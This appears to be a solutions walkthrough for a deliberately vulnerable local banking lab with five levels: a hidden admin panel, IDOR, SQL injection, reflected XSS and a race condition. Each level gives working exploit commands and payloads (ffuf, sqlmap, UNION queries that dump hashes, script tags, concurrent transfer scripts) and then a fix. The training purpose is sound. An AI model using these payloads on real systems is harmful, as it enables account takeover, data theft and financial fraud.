# Solutions (spoilers!)

## hidden_admin - Level 1

**Vulnerability:** the admin panel is "protected" only by not being linked anywhere
(security through obscurity). It has no authentication or authorization check.

1. Register an account. You start with $100.
2. Find hidden paths, using either:
   - `curl http://127.0.0.1:5000/robots.txt`, which shows `Disallow: /admin-panel`
   - or brute-force directories: `gobuster dir -u http://127.0.0.1:5000 -w /usr/share/wordlists/dirb/common.txt`
3. Open `/admin-panel`. It works even when you're logged out.
4. Use "Manual balance adjustment" to credit your user with at least $1,900.
   With curl (the first registered user after a reset gets id 5):
   ```bash
   curl -X POST http://127.0.0.1:5000/admin-panel/adjust -d user_id=5 -d amount=1900
   ```
5. Reload your dashboard to see the flag.

**Fix (see `secure` mode):** check on the server that the user is logged in **and** is an admin
for every admin route. Return 404 instead of 403 if you also want to hide that the panel exists.

## idor - Level 2

**Vulnerability:** Insecure Direct Object Reference. The statement page at
`/account/<id>/statement` takes the account id from the URL and never checks that it
belongs to the logged-in user.

1. Register and log in. Your dashboard shows "Checking account #5".
2. Click "Full statement". The URL is `/account/5/statement`.
3. Change the number. Accounts 1-3 are admin, alice and bob. Account 4 is
   "Richard Vance (VIP)" with $1.25M.
4. His statement has a memo `Safe deposit box #7 rental, code: L2P{...}`. That's the flag.

Enumerating with Burp Intruder or ffuf (copy your `session` cookie from the browser):
```bash
ffuf -u http://127.0.0.1:5000/account/FUZZ/statement -w <(seq 1 50) -b "session=<your cookie>" -mc 200
```

**Fix (see `secure` mode):** authorize every object access on the server. Check that the
account belongs to the current user (or that the user is an admin), and return 404 otherwise.
Random account ids (UUIDs) make guessing harder but are **not** a fix on their own.

## sqli - Level 3

**Vulnerability:** the transaction search (`/transactions?q=...`) pastes your search term
straight into the SQL query, and shows database errors on the page:

```sql
... WHERE (t.from_user = 5 OR t.to_user = 5) AND t.memo LIKE '%<q>%' ORDER BY t.id DESC
```

1. **Confirm it.** Search for `'`. You get `Database error: unrecognized token ...`.
   `' OR 1=1--` shows every customer's transactions, not just yours.
2. **Count the columns.** `' ORDER BY 8--` works, `' ORDER BY 9--` errors, so there are 8.
   (Or try `' UNION SELECT 1,2,3,4,5,6,7,8--` and add/remove numbers until it stops erroring.)
3. **See which columns show up.** `' UNION SELECT 1,2,3,4,5,6,7,8--` adds a row with
   `2` in Date and `7` in Memo (Amount shows `-$0.08`, because column 8 is treated as cents).
   Column 7 (Memo) is the best place for text.
4. **List the tables.** SQLite keeps them in `sqlite_master`:
   ```
   ' UNION SELECT 1,2,3,4,5,6,name||' :: '||sql,8 FROM sqlite_master WHERE type='table'--
   ```
   You'll find `bank_vault (id, label, secret)`.
5. **Dump the vault:**
   ```
   ' UNION SELECT 1,2,3,4,5,6,label||' = '||secret,8 FROM bank_vault--
   ```
   `vault_master_code = L2P{...}` is the flag.

Bonus: `' UNION SELECT 1,2,3,4,5,6,username||':'||password_hash,8 FROM users--` dumps the
password hashes.

With sqlmap (copy your `session` cookie from the browser):
```bash
sqlmap -u "http://127.0.0.1:5000/transactions?q=x" --cookie="session=<your cookie>" -T bank_vault --dump
```

**Fix (see `secure` mode):** never build SQL with string formatting. Use parameterized
queries (`LIKE ?` with the value passed separately), and don't show raw database errors
to users.

## xss - Level 4

**Vulnerability:** the transaction search (`/transactions?q=...`) reflects your search term
back into the page without HTML-escaping, letting you inject arbitrary HTML and JavaScript.

1. **Confirm it.** Go to `/transactions?q=<b>hello</b>`. The word "hello" appears **bold** in the
   results line. That means HTML is being rendered, not escaped.
2. **Pop an alert.** Try:
   ```
   /transactions?q=<script>alert(1)</script>
   ```
   An alert box fires — you have XSS.
3. **Find the flag.** View the page source (`Ctrl+U`). Near the top you'll find:
   ```html
   <script>/* bank internal - do not share */ var XSS_FLAG = "L2P{...}";</script>
   ```
4. **Read the flag with XSS.** Use your injection to execute that variable:
   ```
   /transactions?q=<script>alert(XSS_FLAG)</script>
   ```
   The flag appears in the alert. Alternatively, use `<img src=x onerror=alert(XSS_FLAG)>`
   to trigger execution via an attribute event handler instead of a `<script>` tag.

**Fix (see `secure` mode):** never render user input as raw HTML. Jinja2 auto-escapes
`{{ q }}` by default; using `{{ q | safe }}` deliberately disables that protection.
In a real app, also set a strict `Content-Security-Policy` header to block inline scripts.

## race - Level 5

**Vulnerability:** `/transfer` checks your balance, then (after an artificial 0.2s delay
that exists to make the bug reliably exploitable over HTTP) writes back
`stale_balance - amount` instead of re-checking and decrementing atomically. Fire several
transfers at once and every one of them can read the *same* starting balance before any of
them has written back a lower number - a textbook TOCTOU / "lost update" bug. The recipient
is credited in full for each one that gets through, so money is created from nothing.

1. Register two accounts: `me` (keeps its $100) and `mule` (where the money piles up).
   Log in as `me` and grab its session cookie (e.g. from devtools, or a `requests.Session`).
2. Fire several transfers of $100 from `me` to `mule` **at the same time**, not one after
   another - that's the whole trick. With Python:
   ```python
   import requests, threading
   s = requests.Session()
   s.post("http://127.0.0.1:5000/login", data={"username": "me", "password": "secret1"})

   def send():
       s.post("http://127.0.0.1:5000/transfer", data={"to": "mule", "amount": "100"})

   threads = [threading.Thread(target=send) for _ in range(6)]
   [t.start() for t in threads]
   [t.join() for t in threads]
   ```
   Or with curl, launched in the background so they overlap:
   ```bash
   for i in 1 2 3 4 5 6; do
     curl -s -b cookies.txt -X POST http://127.0.0.1:5000/transfer -d to=mule -d amount=100 &
   done; wait
   ```
3. `me`'s balance check passes for every request (each sees the original $100 before any
   write lands), so several of the six transfers go through. `mule` ends up with far more
   than the $100 that ever really existed; `me`'s balance can even go negative.
4. Log in as `mule`. Once its balance is $500 or more, the flag appears on the dashboard.
   If one run doesn't get enough transfers through, repeat it, or launch more at once -
   the 0.2s delay gives a wide window, but thread scheduling isn't guaranteed.

**Fix (see `secure` mode):** make the check-and-decrement one atomic statement instead of
a separate read then write:
```sql
UPDATE users SET balance_cents = balance_cents - ? WHERE id = ? AND balance_cents >= ?
```
If no row matches (balance was already too low by the time this runs), `rowcount` is 0 and
the transfer is rejected - there's no window between checking and spending for a second
request to sneak into. The same pattern (a conditional, single-statement update) is the
standard fix for this whole class of bug in any relational database.
